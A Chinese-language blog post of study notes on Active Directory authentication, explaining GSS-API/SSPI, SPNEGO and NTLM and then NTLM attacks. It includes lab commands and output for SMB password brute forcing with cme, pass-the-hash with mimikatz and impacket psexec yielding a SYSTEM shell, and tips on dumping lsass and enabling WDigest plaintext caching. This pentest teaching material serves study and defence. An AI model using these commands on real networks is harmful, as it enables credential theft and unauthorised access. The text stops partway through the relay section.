---
layout: article
title: Authentication--AD from 0 to 0.9 part 5
mathjax: true
key: a00009
cover: /bkgs/1.png
modify_date: 2021-10-5
show_author_profile: true
excerpt_type: html
tag: 
- DC
- Pentest
mode: immersive
header:
  theme: dark
article_header:
  type: overlay
  theme: dark
  background_color: '#203028'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(34, 139, 87 , .4), rgba(139, 34, 139, .4))'
    src: /docs/assets/images/cover3.jpg
---

这篇是AD from 0 to 0.9系列笔记的第无部分，主要是身份认证相关<!--more-->

原文： [Attacking Active Directory: 0 to 0.9](https://zer1t0.gitlab.io/posts/attacking_ad/#why-this-post) 

# **Authentication**

了解许多AD攻击的一个关键点是了解身份验证在Active Directory中的工作方式，技术细节放一边，先总结一下

AD有两种认证协议： [NTLM](https://zer1t0.gitlab.io/posts/attacking_ad/#ntlm) and [Kerberos](https://zer1t0.gitlab.io/posts/attacking_ad/#kerberos)，都能认证域用户，Kerberos常用一些但NTLM才能认证本地计算机用户

协商机制[SPNEGO](https://zer1t0.gitlab.io/posts/attacking_ad/#spnego)用来标识那个协议可以使用

![2](/pics/AD_0_TO_0.9/2.jpg)

SPNEGO 协商过的协议必须适配[GSS-API](https://zer1t0.gitlab.io/posts/attacking_ad/#gss-api) 编程接口，以允许c/s项目透明使用他们，

要注意，认证协议不仅被远程登陆使用，本地登陆也会使用，因为计算机需要用DC（请求Kerberos票据）认证域用户。win机器有多种登陆方式（ [logon types](https://zer1t0.gitlab.io/posts/attacking_ad/#logon-types)），有些会缓存用户配置到lsass 进程或存密码在LSA serects 里，

总结完毕，认证主题如下

## **GSS-API/SSPI**

[GSS-API](https://en.wikipedia.org/wiki/Generic_Security_Services_Application_Program_Interface) (Generic Security Service Application Program Interface，通用安全服务接口)定义了可由安全包实现的过程和类型，以便以统一的方式提供身份验证（而非授权）([RFC 2743](https://tools.ietf.org/html/rfc2743))

[RFC 2744](https://tools.ietf.org/html/rfc2744)中定义了C编程语言的过程和类型。因此，与GSS-API兼容的库实现了这些方法和类型。例如， [MIT Kerberos](https://web.mit.edu/kerberos/krb5-1.12/doc/appdev/gssapi.html) 库可以通过调用GSS-API过程而不是直接调用Kerberos过程来使用。一些GSS-API程序包括：

- gss_acquire_cred：返回凭据的句柄。
- gss_init_sec_context：初始化和peer一起使用的安全上下文。
- gss_accept_sec_context：接受peer初始化的安全上下文。

而且GSS-API还帮助维持通信的完整性和机密性

GSS-API包括计算/验证消息的MIC（Message Integrity Code 消息完整性代码）以及加密/解密内容的过程。有关程序如下：

- gss_get_mic: 计算消息的MIC
- gss_verify_mic: 检查MIC以验证消息的完整性
- gss_wrap:     将MIC连接到消息，并可选地加密消息内容.
- gss_unwrap: 验证MIC并解密消息内容

这样用户应用就能光调用GSS-API就能使用不同的安全库了，不需要改变每个库的代码，例如某个程序要通过GSS-API用Kerberos和NTLM认证

```
###Program that can use Kerberos or NTLM authentication
                     .---------------------------.
                     |   Kerberos Library        |
                     .---            .----       |
               .---> | GSS-API  ---> | Kerberos  |
               |     '---            '----       |
               |     |                           |
 .---------.   |     '---------------------------'
 |  user   |---|
 | program |   |     .---------------------------.
 '---------'   |     |       NTLM  Library       |
               |     .---            .----       |
               '---> | GSS-API  ---> | NTLM      |
                     '---            '----       |
                     |                           |
                     '---------------------------'
```

很多win服务都用GSS-API来用Kerberos和NTLM，但是Kerberos不能用在Workgroups里，只能用在DC，因为Kerberos是中心化认证协议。

Windows使用 [SSPI](https://docs.microsoft.com/en-us/windows/win32/secauthn/sspi)（Security Support Provider Interface， 安全支持提供程序接口），它是GSS-API的Microsoft专有变体，带有一些扩展。事实上，SSPI的许多函数相当于GSS-API函数，如下所示：

| **SSPI**                                                     | **GSS-API**            |
| ------------------------------------------------------------ | ---------------------- |
| [AcquireCredentialsHandle](https://docs.microsoft.com/en-us/windows/win32/secauthn/acquirecredentialshandle--general) | gss_acquire_cred       |
| [InitializeSecurityContext](https://docs.microsoft.com/en-us/windows/win32/secauthn/initializesecuritycontext--general) | gss_init_sec_context   |
| [AcceptSecurityContext](https://docs.microsoft.com/en-us/windows/win32/secauthn/acceptsecuritycontext--general) | gss_accept_sec_context |

### **Windows SSPs**

win有许多SSPs (Security Support Provider)，（以DLLs的形式）实现了SSPI并能被应用使用，[Some SSPs](https://en.wikipedia.org/wiki/Security_Support_Provider_Interface)如下：

### **Kerberos SSP**

 [Kerberos SSP](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-kerberos) (kerberos.dll)管理Kerberos认证，也负责缓存Kerberos票据和密钥

### **NTLM SSP**

[NTLMSSP](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm) (msv1_0.dll) 管理NTLM认证，负责缓存NT哈希（mimikatz能从lsass process取出）

### **Negotiate SSP**

 [Negotiate](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-negotiate) SSP (secur32.dll)是一个中间SSP，它管理 [SPNEGO](https://zer1t0.gitlab.io/posts/attacking_ad/#spnego)协商，并根据协商结果将身份验证委托给Kerberos SSP或NTLM SSP

```
###Program that uses Negotiate (SPNEGO)
                                             Kerberos
                                         .-------------------------.
                                         |      kerberos.dll       |
                                         |-------------------------|
                                         .---           .----      |
                   Negotiate       .---> | GSS-API ---> | Kerberos |
                 .-------------.   |     '---           '----      |
                 | secur32.dll |   |     |                         |
                 |-------------|   |     '-------------------------'
 .---------.     .---          |   |
 |  user   |---->| GSS-API ----|>--|
 | program |     '---          |   |         NTLM
 '---------'     |             |   |     .-------------------------.
                 '-------------'   |     |       msv1_0.dll        |
                                   |     |-------------------------|
                                   |     .---           .----      |
                                   '---> | GSS-API ---> | NTLM     |
                                         '---           '----      |
                                         |                         |
                                         '-------------------------'
```

### **Digest SSP**

 [Digest](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-digest-ssp) (wdigest.dll)应用了Digest Access protocol（摘要访问协议）；在HTTP上用；在老版本系统上缓存明文密码，mimikatz可以拿。

尽管密码缓存在Windows 2008 R2默认不开启，设置HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential 为1或在内存直接改[patching the Digest SSP ](https://blog.xpnsec.com/exploring-mimikatz-part-1/)开启缓存。

### **Secure Channel SSP**

[Secure Channel](https://docs.microsoft.com/en-us/windows/win32/secauthn/secure-channel) (schannel.dll)提供加密通信，用于将SSL/TLS层添加到HTTP通信中。

### **Cred SSP**

[CredSSP](https://docs.microsoft.com/en-us/windows/win32/secauthn/credential-security-support-provider) (credssp.dll)创建TLS通道，通过协商SSP认证客户端，并最终允许客户端发送完整用户凭证到服务器；被 [RDP](https://zer1t0.gitlab.io/posts/attacking_ad/#rdp)使用

### **Custom SSPs**

第三方能添加 [custom SSP](https://docs.microsoft.com/en-us/windows/win32/secauthn/custom-security-packages)，在注册表HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages里，这SSP也能当作[AP](https://docs.microsoft.com/en-us/windows/win32/secauthn/ssp-aps-versus-ssps#sspaps) (Authentication Package)，被登录程序使用。其实，SSP/AP的注册被 [mimikatz](https://github.com/gentilkiwi/mimikatz)使用来 [steal passwords](https://www.hackingarticles.in/credential-dumping-security-support-provider-ssp/)

## **SPNEGO**

SPNEGO (Simple and Protected GSS-API Negotiation)是一种机制，允许客户端-服务器应用程序协商应用程序使用的与GSS-API兼容的底层安全协议，这样，客户端（在RFC4178中也称为initiator）和服务器（称为acceptor）都可以建立相同的GSS环境（通过调用GSS_Init_sec_context）

SPNEGO的流程基本上如下所示：

1.客户端（initiator）调用*GSS_Init_sec_context* 并指示将使用SPNEGO。然后返回一个包含安全机制选项的列表（mechTypes）和可选的用于首选机制的初始令牌（mechToken）。此信息在消息*NegTokenInit*中发送到服务器（acceptor）。

![3](/pics/AD_0_TO_0.9/3.jpg)

​			SPNEGO NegTokenInit with Kerberos initial token

2.服务器应用传递初始token和安全机制列表到*GSS_Accept_sec_context*。然后以下某一结果返回并包含在*NegTokenResp* 信息中发出（NegTokenResp与Wireshark显示的NegTokenTarg相同）：

- 所有安全机制都不被接受。服务器拒绝协商。
- 如果客户端首选所选的安全机制，则使用接收到的令牌。将创建包含*accept-complete*状态的协商令牌。
- 选择了首选机制以外的其他机制，因此创建了一个具有*accept-incompleted* 或*request-mic*状态的协商令牌。

![4](/pics/AD_0_TO_0.9/4.jpg)

​			SPNEGO NegTokenResp with accept-complete response

3.如果协商返回给客户端，则会将其传递给*GSS_Init_sec_context* 并对其进行分析。协商将继续进行，直到客户端和服务器在安全机制和选项方面达成一致。

```
###SPNEGO negotiation
									Client              Server
                                        |                 |
 GSS_Init_sec_context(SPNEGO=True) <--- |                 |
                                   ---> |   NegTokenInit  |
                            1) Kerberos | --------------> |  
                               (Token)  |    Security?    |  
                            2) NTLM     |    1) Kerberos  |
                                        |       (Token)   |
                                        |    2) NTLM      | Kerberos (Token)
                                        |                 | ---> GSS_Accept_sec_context()
                                        |   NegTokenResp  | <---
                                        | <-------------- | (Token)
                                        |     (Token)     | accept-complete
                                  Token | accept-complete |
            GSS_Init_sec_context() <--- |                 | 
                                        |                 |
                                        |                 |
```

win通过 [Negotiate SSP](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-negotiate)来使用SPNEGO ，这允许像SMB的服务用Kerberos or NTLM认证，Kerberos主认证域用户而NTLM主认证本地计算机用户。通常有第三个选项[NEGOEX](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-negoex)，允许amplify （增强？）SPNEGO 选项，但作者似乎从没看到有用过

实际上，Windows使用的是SPNEGO的扩展，叫 [SPNG](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-spng/f377a379-c24f-4a0f-a3eb-0d835389e28a)。此扩展包括对SPNEGO的改进，例如一条名为*NegTokenInit2* 的新消息，该消息允许服务器初始化SPNEGO协商。

![5](/pics/AD_0_TO_0.9/5.jpg)

​			SPNEGO negotiation*

## **NTLM**

### **NTLM Basics**

[NTLM](http://davenport.sourceforge.net/ntlm.html) (NT LAN Manager) 是一种身份验证协议，Windows服务可以使用它来验证客户端的身份，在[NTLM SSP](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm)中实现，除了认证外还能通过签名或加密信息来保护通信

一些概念：

| **NTLM**                                                     | 对远程计算机中的用户进行身份验证的网络协议，也叫Net-NTLM     |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| **NTLMv1**                                                   | 第一版NTLM，也叫Net-NTLMv1                                   |
| **NTLMv2**                                                   | 第一版计算会话密钥和NTLM哈希的方式不同，Net-NTLMv2           |
| **NTLM2**                                                    | 安全增强版NTLMv1 ，但还是比**NTLMv2****弱一点**              |
| **NTLM hash/response**                                       | 对服务器质询的响应，根据NT哈希计算，Net-NTLM  hash and NTLM response |
| **NTLMv1 hash**                                              | NTLM hash created by NTLMv1                                  |
| **NTLMv2 hash**                                              | The NTLM  hash created by NTLMv2                             |
| [NT hash](https://zer1t0.gitlab.io/posts/attacking_ad/#lm-nt-hashes) | 从用户密码派生的散列，用作NTLM身份验证的secret ，通常叫NTLM hash，但不对，NTLM hash应该是有NTLM协议生成的 |
| [LM hash](https://en.wikipedia.org/wiki/LAN_Manager#LM_hash_details) | 旧的LAN Manager散列源于用户密码，已过时且未广泛使用。很容易破解。 |
| **LM Response**                                              | 服务器问询的LM回应，通过用LM哈希计算；可以和NTLM回应一起使用；这种回应是过时的 |
| **LMv1**                                                     | version 1  of the LM Response                                |
| **LMv2**                                                     | The  version 2 of the LM Response.                           |

NTLM 并不是一个产生网络流量的独立协议，但必须被整合在一个应用协议里使用，例如[SMB](https://zer1t0.gitlab.io/posts/attacking_ad/#smb), [LDAP](https://zer1t0.gitlab.io/posts/attacking_ad/#ldap) or [HTTP](https://zer1t0.gitlab.io/posts/attacking_ad/#http)

而且NTLM能被用在AD和工作组中；即便域能ban掉NTLM，但还是在大多数网络中（Kerberos不能认证本地用户）

NTLM认证有三阶段/信息：NEGOTIATE, CHALLENGE and AUTHENTICATE

```
client               server
  |                    |
  |                    |
  |     NEGOTIATE      |
  | -----------------> |
  |                    |
  |     CHALLENGE      |
  | <----------------- |
  |                    |
  |    AUTHENTICATE    |
  | -----------------> |
  |                    |
  |    application     |
  |      messages      |
  | -----------------> |
  | <----------------- |
  | -----------------> |
  |                    |
```

1.首先，客户端初始化安全环境后，通过调用NTLM SSP 的 InitializeSecurityContext ，发送NEGOTIATE 信息到服务器，标识安全选项，比如用什么NTLM版本

![6](/pics/AD_0_TO_0.9/6.png)

​			*NTLM negotiate message*

2.服务器通过调NTLM SSP的AcceptSecurityContext 生成一个问询，并包含在CHALLENGE 信息中发送给客户端，并确定协商选项并发送与自己计算机名和版本和域名有关信息

![7](/pics/AD_0_TO_0.9/7.png)

​			*NTLM challenge message*

3.客户端接收质询并给InitializeSecurityContext 以便使用客户端密钥（NT哈希）计算响应；需要的话还能创建会话密钥并用密钥加密，即会话基密钥（派生自NT hash）。客户端将响应和会话密钥发回服务器；且会发送叫av_pairs的[different attributes](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/83f5e789-660d-4781-8491-5f8c6641f75e)，如与自己计算机名和版本和域名和协商flags有关信息；并且会包含MIC (Message Integrity Code)防篡改。

![8](/pics/AD_0_TO_0.9/8.png)

​			*NTLM authenticate message*

4.最后服务器验证问询响应是正确的（AcceptSecurityContext）并建立一个安全会话/环境；接下来的信息会被会话密钥加密/签名

![9](../pics/AD_0_TO_0.9/9.png)

```
                         client               server
                           |                    |
 AcquireCredentialsHandle  |                    |
           |               |                    |
           v               |                    |
 InitializeSecurityContext |                    |
           |               |     NEGOTIATE      |
           '-------------> | -----------------> | ----------.
                           |     - flags        |           |
                           |                    |           v
                           |                    | AcceptSecurityContext
                           |                    |           |
                           |                    |       challenge
                           |     CHALLENGE      |           |
           .-------------- | <----------------- | <---------'
           |               |   - flags          |
       challenge           |   - challenge      |
           |               |   - server info    |
           v               |                    |
 InitializeSecurityContext |                    |
       |       |           |                    |
    session  response      |                    |
      key      |           |    AUTHENTICATE    |
       '-------'---------> | -----------------> | ------.--------.
                           |   - response       |       |        |
                           |   - session key    |       |        |
                           |     (encrypted)    |   response  session
                           |   - attributes     |       |       key
                           |     + client info  |       |        |
                           |     + flags        |       v        v
                           |   - MIC            | AcceptSecurityContext
                           |                    |           |
                           |                    |           v
                           |                    |           OK
                           |                    |
```

​			*NTLM authentication process*

NTLM认证由 [NTLM SSP](https://zer1t0.gitlab.io/posts/attacking_ad/#ntlm-ssp)处理，独立于用它的应用协议；为了证明身份客户端必须要有密钥。NTLM身份验证中使用的密钥是充当客户端的用户的NT哈希（在NTLMv1中也使用LM哈希）

然而，在NTLM中，NT哈希不会通过网络传输，而是仅用于计算NTLM对服务器质询和会话密钥的响应。NTLM响应也称为NTLM哈希（也称为Net-NTLM哈希）。NTLM哈希的计算取决于NTLM协议的版本

（NTLM使用时，凭证不会在网络中传输，因此不会被目标机器缓存，也就不能被mimikatz拿到）

NTLM协议现有两个版本[NTLMv1](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/464551a8-9fc4-428e-b3d3-bc5bfb2e73a5) and [NTLMv2 ](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/5e550938-91d4-459f-b67d-75d70009e3f3)， 版本 [is not negotiated in the transmission](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/5e550938-91d4-459f-b67d-75d70009e3f3) but [must be configured properly in client and server](http://woshub.com/disable-ntlm-authentication-windows/).

但别的安全参数会被 [negotiated](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/99d90ff4-957f-4c8a-80e4-5bfe5a9a9832) ：

| 会话签名                     | 防[NTLM Relay](https://zer1t0.gitlab.io/posts/attacking_ad/#ntlm-relay)攻击 |
| ---------------------------- | ------------------------------------------------------------ |
| 会话密封/加密                | 不常用                                                       |
| 生成LM响应                   | 如果不需要LM响应，服务器将不会对其进行处理                   |
| 使用NTLMv2或NTLMv1会话安全性 | 会话安全不是认证版本，而是改进NTLMv1身份验证安全性的扩展     |

 NTLMv1 and NTLMv2不同如下：

#### **NTLMv1**

在 [NTLMv1](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/464551a8-9fc4-428e-b3d3-bc5bfb2e73a5)中，对服务器质询的NTLM响应（NTLMv1哈希）是通过使用NT哈希来使用DES算法加密服务器质询来计算的。会话密钥也直接用NT散列加密

（NTLMv1可以与NTLMv2会话安全一起使用，这不是NTLMv2，而是增强NTLMv1安全性的扩展）

```
###NTLMv1 Authentication
                    Server                  Client
                   challenge               challenge
                       |           (if NTLMv2 Session Security)
                       |                       |
                       '-----------.-----------'
                                   |
                                   v
             .---> LM hash -->
Password ----|                   NTLMv1
             '---> NT hash -->         
                                   v
                                   |
                   .---------------|----------------.
                   |               |                |
                   v               v                v
             NTv1 Response   LMv1 Response    Session Base Key
             (NTLMv1 Hash)   (LMv1 Hash)
```

#### **NTLMv2**

然而，在NTLMv2中，需要更多的数据来保护AUTHENTICATE 消息的完整性，从而保护会话的完整性。要计算响应（NTLM哈希），NTLMv2将考虑：

- 服务器问讯
- 随机生成的客户端问询
- 当前时间戳
- [AvPairs](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/83f5e789-660d-4781-8491-5f8c6641f75e) field，包含服务器域/主机名，Mic 是否包含在信息中 (MsvAvFlags)等（在文档中，AvPairs被记录为令人困惑的ServerName字段）

```
###NTLMv2 Authentication
                                                          .---
                                                          | - Domain
           Server       Client      Timestamp    AvPairs <  - Dns 
          challenge    challenge        |           |     | - IsMicPresent?
              |            |            |           |     | - Etc...
              |            |            |           |     '---
              '------------'-----.------'-----------'                         
                                 |
                                 v                                          

  Password ---> NT hash ---->  NTLMv2

                                 |
                                 |
                 .---------------|----------------.
                 |               |                |
                 v               v                v
           NTv2 Response   LMv2 Response    Session Base Key
           (NTLMv2 Hash)   (LMv2 Hash)
```

NTLMv2连接所有这些数据，并应用HMAC计算NTLM响应，称为NTLMv2哈希。此外，该数据还用于计算会话密钥

#### **MIC**

为保证NTLM协商的完整性，AUTHENTICATE 信息使用了MIC，[MIC is calculated](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/f9e6fbc4-a953-4f24-b229-ccdcc213b9ec)通过使用会话密钥对NTLM进程的所有消息应用HMAC

```
###MIC calculation
           NEGOTIATE        CHALLENGE        AUTHENTICATE
               |                |                 |
               '----------------'-----------------'
                                |
                                v
                                
 Exported Session Key ---->  HMAC-MD5

                                |
                                v
                               MIC
```

flag会显示MIC被使用，因此移除MIC会导致认证失败；MIC一直是目标，发现了[*Drop the MIC*](https://www.preempt.com/blog/cve-2019-1040-windows-vulnerability/) and [*Drop the MIC 2*](https://www.preempt.com/blog/active-directory-ntlm-attacks/)漏洞

NTLMv1 创建响应时没有考虑NTLM flags，因此用NTLMv1 时攻击者可以 [NTLM Relay](https://zer1t0.gitlab.io/posts/attacking_ad/#ntlm-relay) 来移除AUTHENTICATE 的MIC（并调整flags, [*Drop the MIC*](https://www.preempt.com/blog/cve-2019-1040-windows-vulnerability/)）来改信息比如ban掉应用信息的签名

### **NTLM in Active Directory**

NT hash存在AD数据库的，在DC里，因此要为了域账户验证AUTHENTICATE信息的话目标机器会发送网络登陆请求到DC来验证客户端对质询的响应，DC验证此响应并将必要的信息（如会话密钥）返回给计算机，以便继续应用程序会话

```
###NTLM process with domain accounts
  client            server                          DC
    |                 |                              |
    |                 |                              |
    |    NEGOTIATE    |                              |
    | --------------> |                              |
    |                 |                              |
    |    CHALLENGE    |                              |
    | <-------------- |                              |
    |                 |                              |
    |   AUTHENTICATE  |  NetrLogonSamLogonWithFlags  |
    | --------------> | ---------------------------> |
    |                 |                              |
    |                 |        ValidationInfo        |
    |                 | <--------------------------- |
    |                 |                              |
    |   application   |                              |
    |    messages     |                              |
    | --------------> |                              |
    |                 |                              |
    | <-------------- |                              |
    |                 |                              |
    | --------------> |                              |
    |                 |                              |
```

NTLM还可用于不同域中的计算机，如果使用的帐户来自服务器所在的另一个域，则必须要求DC验证AUTHENTICATE 消息，DC反过来必须将AUTHENTICATE 消息发送到用户帐户域的DC（通过使用域信任）以进行验证

```
###Inter-domain NTLM process
  client            server                          DC                      DC
 (it.foo.com)     (foo.com)                      (foo.com)         (it.foo.com)
    |                 |                              |                       |
    |                 |                              |                       |
    |    NEGOTIATE    |                              |                       |
    | --------------> |                              |                       |
    |                 |                              |                       |
    |    CHALLENGE    |                              |                       |
    | <-------------- |                              |                       |
    |                 |                              |                       |
    |   AUTHENTICATE  |  NetrLogonSamLogonWithFlags  |  NetrLogonSamLogonEx  |
    | --------------> | ---------------------------> | --------------------> |
    |                 |                              |                       |
    |                 |      ValidationInfo          |    ValidationInfo     |
    |                 | <--------------------------- | <-------------------- |
    |                 |                              |                       |
    |   application   |                              |                       |
    |    messages     |                              |                       |
    | --------------> |                              |                       |
    |                 |                              |                       |
    | <-------------- |                              |                       |
    |                 |                              |                       |
    | --------------> |                              |                       |
    |                 |                              |                       |
```

这样NTLM就能用在AD里了，不过Kerberos是默认选项

要强制使用NTLM可以指定IP来连接目标机器而不是主机名，因为Kerberos需要主机名来确认机器服务。dir [\\dc01\C$](file://dc01/C$) 就会用Kerberos远程共享而dir [\\192.168.100.2\C$](file://192.168.100.2/C$) 会用NTLM

### **NTLM Attacks**

Now that we know how NTLM works, let's talk about how it can be used in a pentest.

#### **NTLM Recon**

NTLM可用于侦察，因为如果[NTLMSSP_NEGOTIATE_TARGET_INFO](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/99d90ff4-957f-4c8a-80e4-5bfe5a9a9832) flag 在NEGOTIATE 信息里服务器就会在CHALLENGE 信息里以[AvPairs](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/83f5e789-660d-4781-8491-5f8c6641f75e)返回TargetInfo ，包含像域名主机名等信息

![10](/pics/AD_0_TO_0.9/10.png)

​			*Server information in NTLM CHALLENGE message*

当我们只知道机器的IP并且服务器上有一个NTLM友好的服务（如SMB或HTTP）可用时，此信息有助于识别机器。这可用于在网络中执行反向解析。

```powershell
###SMB scan
$ ntlm-info smb 192.168.100.0/24

Target: 192.168.100.7
NbComputer: WS02-7
NbDomain: CONTOSO
DnsComputer: ws02-7.contoso.local
DnsDomain: contoso.local
Version: 6.1.7601
OS: Windows 7 | Windows Server 2008 R2

Target: 192.168.100.10
NbComputer: WS01-10
NbDomain: CONTOSO
DnsComputer: ws01-10.contoso.local
DnsDomain: contoso.local
DnsTree: contoso.local
Version: 10.0.19041
OS: Windows 10 | Windows Server 2019 | Windows Server 2016
```

外网也能用，像是支持NTLM的HTTP服务器如 [Outlook Web App](https://support.microsoft.com/en-us/office/getting-started-in-outlook-web-app-0062c7be-f8e3-486e-8b14-5c1f793ceefd?ui=en-US&rs=en-US&ad=US)

外网这种情况就可能会泄露组织内部域的名称，了解该名称有助于在github中搜索密钥或密码泄漏，或在VPN网关面板中使用它进行暴力攻击。

工具有 [NTLMRecon](https://github.com/pwnfoo/NTLMRecon)（能HTTP路径爆破），[ntlm-info](https://gitlab.com/Zer1t0/ntlm-info) (supports HTTP and SMB)，使用 [the following wordlist](https://gitlab.com/Zer1t0/barrido/-/blob/master/wordlists/ntlm.txt)标识支持NTLM的web端点

#### **NTLM brute-force**

由于NTLM是一种身份验证协议，因此可以使用任何支持NTLM的应用程序协议来测试用户凭据或发起暴力攻击。通常使用 [SMB](https://zer1t0.gitlab.io/posts/attacking_ad/#smb-shares)，但也可以使用 [MSSQL](https://zer1t0.gitlab.io/posts/attacking_ad/#sql-server)或 [HTTP](https://zer1t0.gitlab.io/posts/attacking_ad/#http)等。

爆破工具： [hydra](https://github.com/vanhauser-thc/thc-hydra), [nmap](https://nmap.org/nsedoc/scripts/smb-brute.html), [cme](https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference#using-usernamepassword-lists), or [Invoke-Bruteforce.ps1](https://github.com/samratashok/nishang/blob/master/Scan/Invoke-BruteForce.ps1)

```text
###Example of NTLM bruteforce attack using cme
$ cme smb 192.168.100.10 -u anakin -p passwords.txt 
SMB         192.168.100.10  445    WS01-10          [*] Windows 10.0 Build 19041 x64 (name:WS01-10) (domain:contoso.local) (signing:False) (SMBv1:False)
SMB         192.168.100.10  445    WS01-10          [-] contoso.local\anakin:1234 STATUS_LOGON_FAILURE 
SMB         192.168.100.10  445    WS01-10          [-] contoso.local\anakin:Vader! STATUS_LOGON_FAILURE 
SMB         192.168.100.10  445    WS01-10          [+] contoso.local\anakin:Vader1234! (Pwn3d!)
```

爆破需要注意，账户会被锁，SMB响应的AUTHENTICATE 会包含STATUS_ACCOUNT_LOCKED_OUT；而且会产生很多流量(因为目标会验证凭证 [against the DC](https://en.hackndo.com/ntlm-relay/#session-key))， [Windows-ATA](https://docs.microsoft.com/en-us/advanced-threat-analytics/what-is-ata)也会检测往DC的流量

#### **Pass the hash**

[Pass-The-Hash](https://en.hackndo.com/pass-the-hash/) (PtH)也使用的是NTLM协议，NTLM计算NTLM哈希和会话密钥用的是c/s的NT哈希，因此知道客户端哈希就能来伪造用户，即便不知道明文密码

这种方式现在越来越重要了，因为像mimikatz这种从 [lsass](https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf) 获取明文密码的方式被微软施加了很多防护措施；但还是能够拿到NT哈希，除非 [credential guard](https://docs.microsoft.com/en-us/archive/blogs/ash/windows-10-device-guard-and-credential-guard-demystified)开着（can [be byppassed](https://teamhydra.blog/2020/08/25/bypassing-credential-guard/)）

从lsass拿NT哈希可以用 [mimikatz sekurlsa::logonpasswords](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#logonpasswords) 或者用[procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [sqldumper or others](https://lolbas-project.github.io/#/dump)等dump [lsass process](https://www.c0d3xpl0it.com/2016/04/extracting-clear-text-passwords-using-procdump-and-mimikatz.html)并拿到本地用[mimikatz](https://github.com/gentilkiwi/mimikatz), [pypykatz](https://github.com/skelsec/pypykatz) 读，或用 [lsassy](https://github.com/Hackndo/lsassy) [read the dump remotely](https://en.hackndo.com/remote-lsass-dump-passwords/)。

NT hashes can also be extracted [from the local SAM database](https://www.hackingarticles.in/credential-dumping-sam/) or the [NTDS.dit database in Domain Controllers](https://www.hackingarticles.in/credential-dumping-ntds-dit/).

win上可能需要[inject the NT hash in a process](https://www.praetorian.com/blog/inside-mimikatz-part1/) with [mimikatz ](https://github.com/gentilkiwi/mimikatz)来在远程机器上用内置工具或IT工具 [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)等认证。此外像 [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) 的特殊工具能将NT哈希当参数传递

```powershell
###Pass-The-Hash with mimikatz
PS C:\Users\Anakin\Downloads> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:b73fdfe10e87b4ca5c0d957f81de6863
user    : Administrator
domain  : contoso.local
program : cmd.exe
impers. : no
NTLM    : b73fdfe10e87b4ca5c0d957f81de6863
  |  PID  1080
  |  TID  2664
  |  LSA Process is now R/W
  |  LUID 0 ; 2124820 (00000000:00206c14)
  \_ msv1_0   - data copy @ 000001E6F01AE490 : OK !
  \_ kerberos - data copy @ 000001E6EF86CCD8
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 000001E6F01D7E38 (32) -> null
```

（注意：当注入其他用户的NT哈希（或Kerberos票证）时，这将只允许您在远程连接中模拟其他用户，而不是在本地计算机中）

Linux上实施Pass-The-Hash用 [impacket ](https://github.com/SecureAuthCorp/impacket)可以直接把NT哈希当参数

```powershell
###Pass-The-Hash with psexec.py of impacket
$ psexec.py contoso.local/Anakin@192.168.100.10 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 192.168.100.10.....
[*] Found writable share ADMIN$
[*] Uploading file WFKqIQpM.exe
[*] Opening SVCManager on 192.168.100.10.....
[*] Creating service AoRl on 192.168.100.10.....
[*] Starting service AoRl.....
[!] Press help for extra shell commands
The system cannot find message text for message number 0x2350 in the message file for Application.

(c) Microsoft Corporation. All rights reserved.
b'Not enough memory resources are available to process this command.\r\n'
C:\Windows\system32>whoami
nt authority\system
```

#### **NTLM Relay**(中继？)

 [NTLM Relay](https://en.hackndo.com/ntlm-relay/) attack，最出名的NTLM攻击（参考：[*NTLM Relay*](https://en.hackndo.com/ntlm-relay/)，包含很多很好的 [NTLM Relay matrix](https://en.hackndo.com/ntlm-relay/#what-can-be-relayed)）

NTLM Relay attack，攻击者需要中间人攻击，利用其中间位置将NTLM身份验证重定向到目标服务器，以获得经过身份验证的会话

```
###NTLM relay attack
    client                 attacker               server
      |                       |                     |
      |                       |                -----|--.
      |     NEGOTIATE         |     NEGOTIATE       |  |
      | --------------------> | ------------------> |  |
      |                       |                     |  |
      |     CHALLENGE         |     CHALLENGE       |  |> NTLM Relay
